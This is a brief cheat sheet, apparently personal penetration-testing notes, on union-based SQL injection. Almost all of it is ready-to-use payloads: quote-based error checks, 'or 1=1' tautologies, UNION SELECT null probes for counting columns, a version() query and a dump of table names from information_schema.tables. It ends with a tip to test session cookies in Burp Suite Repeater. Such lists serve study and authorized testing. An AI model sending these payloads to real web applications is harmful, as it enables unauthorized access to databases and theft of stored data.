# SQL Injection

## Union

Check for errors by using single quote `/'/` or double quotes `/"/`

like

jermy' or jermy''

```
jerymy' or 1=1#
```

```
jerymy' or 1=1-- -
```

```
jerymy' union select null#
```

```
jerymy' union select null,null#
```

```
jerymy' union select null,null,null#
```

```
jerymy' union select null,null,version()#
```

```
jerymy' union select null,null,table_name from information_schema.tables#
```

sometime need to play with the variables like

```
jerymy' union select null(int),null,null#
```

&#x20;Check for session cookies for SQL injection too using burp suite repeater

